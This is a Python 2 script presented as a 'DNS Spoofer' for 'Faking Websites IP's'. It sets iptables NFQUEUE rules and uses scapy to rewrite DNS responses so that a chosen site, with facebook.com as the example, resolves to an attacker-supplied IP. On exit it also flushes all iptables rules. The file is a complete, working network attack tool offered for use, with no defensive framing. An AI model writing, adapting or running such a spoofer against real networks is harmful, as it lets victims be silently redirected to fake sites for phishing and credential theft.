#!/usr/vin/env python
import netfilterqueue
import scapy.all as scapy
import os

# run " pip install netfilterqueue  "
# in order to get the script working


def tables_setup():
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=redirect)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


tables_setup()
try:
    print("J3wker | DNS Spoofer | Faking Websites IP's\n")
    print("\t\t(\_/)")
    print("\t\t(0_0)")
    print("----------------")
    print("Example: www.facebook.com\n")
    target = raw_input("Please enter the attacked website > ")
    print("----------------")
    redirect = raw_input("Please enter the redirect IP > ")
    print("----------------")
    print("DNS Spoofing Activated")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print("\nDetected CTRL + C.... Quitting Program")
